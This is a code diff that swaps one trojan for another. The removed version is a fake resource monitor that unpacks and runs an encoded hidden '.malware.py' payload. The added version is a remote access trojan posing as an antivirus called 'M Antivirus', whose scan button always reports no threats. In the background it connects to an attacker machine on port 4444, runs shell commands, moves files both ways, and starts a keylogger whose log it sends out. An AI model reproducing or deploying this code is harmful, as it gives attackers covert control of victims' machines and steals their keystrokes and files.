@@ -1,51 +1,132 @@
-#!/usr/bin/python3
-import psutil
+import socket
+import subprocess
+import os
 import base64
 import time
-import gzip
-import os
+import threading
+import tkinter as tk
+from tkinter import ttk
+from keylogger import startKeylogger
+
+
+# RAT:
+
+def connect():
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect(('192.168.1.4', 4444))  # IP and Port of the attacker machine
+			return s
+		except Exception:
+			time.sleep(10)
+			continue
+
+
+def execute_commands(command):
+	try:
+		output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+		return output.decode(errors='replace')
+	except Exception as e:
+		return str(e)
+
+
+def write_file(path, content):
+	with open(path, 'wb') as file:
+		file.write(base64.b64decode(content))
+
+
+def read_file(path):
+	with open(path, 'rb') as file:
+		content = base64.b64encode(file.read())
+		return content.decode()
+
+
+def rat_client():
+	s = connect()
+	try:
+		while True:
+			data = s.recv(1024)
+			if not data:
+				break
+			command = data.decode()
+			if command.lower() == 'exit':
+				break
+			elif command.startswith('cd '):
+				try:
+					os.chdir(command[3:])
+					s.send(str.encode(os.getcwd()))
+				except Exception as e:
+					s.send(str.encode(str(e)))
+			elif command.startswith('download '):
+				path = command[9:]
+				if os.path.exists(path):
+					s.send(str.encode(read_file(path)))
+				else:
+					s.send(str.encode("File not found"))
+			elif command.startswith('upload '):
+				path = command[7:]
+				content = s.recv(100000).decode()
+				write_file(path, content)
+				s.send(str.encode("Upload complete"))
+			elif command == 'keylogger':
+				keylogger_thread = threading.Thread(target=startKeylogger, daemon=True)
+				keylogger_thread.start()
+			elif command == 'sendLog':
+				if os.path.exists("Keylogg.txt"):
+					s.send(str.encode(read_file("Keylogg.txt")))
+				else:
+					s.send(str.encode("No keylog file found"))
+			else:
+				output = execute_commands(command)
+				s.send(str.encode(output))
+	finally:
+		s.close()
+
+
+# M antivirus GUI:
+
+def start_scan():
+	progress['value'] = 100
+	root.update_idletasks()
+	result.config(text="Scan Completed No threats found :) ")
+
+
+def create_gui():
+	global root, progress, result
+	root = tk.Tk()
+	root.title("M Antivirus")
+
+	frame = ttk.Frame(root, padding=20)
+	frame.grid(row=0, column=0)
+
+	scanButton = ttk.Button(frame, text="Start Scan", command=start_scan)
+	scanButton.grid(row=0, column=0, pady=10)
+
+	progress = ttk.Progressbar(frame, orient=tk.HORIZONTAL, length=200, mode='determinate')
+	progress.grid(row=1, column=0, pady=10)
+
+	result = ttk.Label(frame, text="")
+	result.grid(row=2, column=0, pady=10)
+
+	root.mainloop()
+
+
+# Main
 
 def main():
-	# fork a child process
-	pid = os.fork()
+	ratThread = threading.Thread(target=rat_client, daemon=True)
+	ratThread.start()
 
-	if pid > 0:
-		# parent process
-		while True:
-			# percentage of used CPU
-			cpu = psutil.cpu_percent()
-			# percentage of used RAM
-			ram = psutil.virtual_memory().percent
-			# percentage of used disk space
-			disk = psutil.disk_usage("/").percent
-			# number of all running processes
-			processes_count = 0
-			for _ in psutil.process_iter():
-				processes_count += 1
-			
-			# print to screen
-			print("---------------------------------------------------------")
-			print("| CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
-			print("| {:02}%       | {:02}%       | {:02}%        | {}               |".format(int(cpu), int(ram), int(disk), processes_count))
-			print("---------------------------------------------------------")
-
-			# sleep for 2s
-			time.sleep(2)
-	else:
-		# child process
-		trojan()
-
-
-def trojan():
-	malware_fd = open(".malware.py", "w")
-	blob = "H4sICAncMmEAA21hbHdhcmUucHkAjVZtb9s2EP7uX3FTB0RCZMmKHadx4WHB0K7d1q5YO2BYEgi0RMesZVIj6cSJ4/++IyX6TXY22bBJ3nMvfHh31Kvv4rmS8YjxuHzUE8G7LTYrhdQg6T9zqrRycyWyKdVuNiKK9ntu9k0JvtFzI6FarVZOxzAjjPvBoAX4vII7qmEilOZkRkGMQU8oIrIJ49Qi1rJh7TNCDbfoB60tM0a1nI8KlgEr73tA8lxSpQ5apSSnUqHRpZ2bx/tTUdm+uqNcewPwPoonVhQkPo864P+VJG/gN8bnC1i87qf93huQ94OL11EngJ9pNhXxWSfp4DeBd0zSsVjERuhZ4yv7W0WWshKdOjbNXnxvonWpBnHMSlKyKBM48MKtEOtREGm60G7DihKZTWAsJIyYzgTjQHgOFNkt3M6psuBanq5X04IpjYavb63c6hyVGg9SCB2Cmo9yJlUIY1ZQBehRqOiBFFPfiydiRr36UJ2WgRmUhW9EVoxL6ThHL6Kk3PeWq3i58iLUmhHtV+4MJgjBk16wo6vl466xihCJLNlzzgTXeIb23CkxHKGhhoKNYA0duogiY8YPIqUlK1167To6xPwO39tPg3t7+tGY8ZwUhS89/zrp3i6T1TVpT2ftp6v2+1/anz63/07al7fLs37Y7a6eR1mC4qeOWepehueXq8ALd3fwX5EeyovtZy8H9qOs3Ufp7emPLpTTm8gMMfjwYvW/4skmWCrAxvBAYULuKUY2x5wl/LHJJLigm7GigQKTpkFtAD9Ap5kaB4/BJfkRwWlTcCyMPeZeCOJInR1cPt1fbvLpMjYrhDKdcMfVIqOlboZREmXacHUcpmfi8doSBNOjkXTeaJVGmlbSoSn4sqpYTrXSREO7LAjX8Ax3kpbQZmDCR3vPQB6mcLIsJUPx973VyRrzGU5ucsya7uomOjoY2P/z1YkX1DV5IJr1xNVrpMqCYUu94XXTqLdKeSZyCjnRBLSwN5Rtl4py2zRmZjUTsxmx+ZjbJiJFgQB5T6W1YpV3LoyaptRdR3htuGHYRGFXH2xugQOAzXYQuJlsIZvZaisI4YfzeEt1P8uc4qHsq2+tmrvqcncUmvSw9Bk6quvDCvK05qeCR6N+rxL4Bh3l81mpfAMJono9CDZ3GTLuzuaFU6jhGeaDpkDqFwIQo280q4JWm9eE6s+vZ1fv0g+f3n4NnfTL7z/9mn75+sfbq4/rMNAbR0MvB2FKxL7PJN3uReUzqhV930vOLqIOfhLshwYQBDXEbNHfZsoJXPW2WthP0tTkTprCcAhempo3pTT1qjKuXpv+BfXo/OqiCQAA"
-	malware = gzip.decompress(base64.b64decode(blob)).decode("UTF-8")
-	malware_fd.write(malware)
-	malware_fd.close()
-
-	# execute malware
-	os.system("/usr/bin/python3 .malware.py")
+	create_gui()
 
 
 if __name__ == "__main__":
 	main()
+
+
+		
+
+        
+
+
+
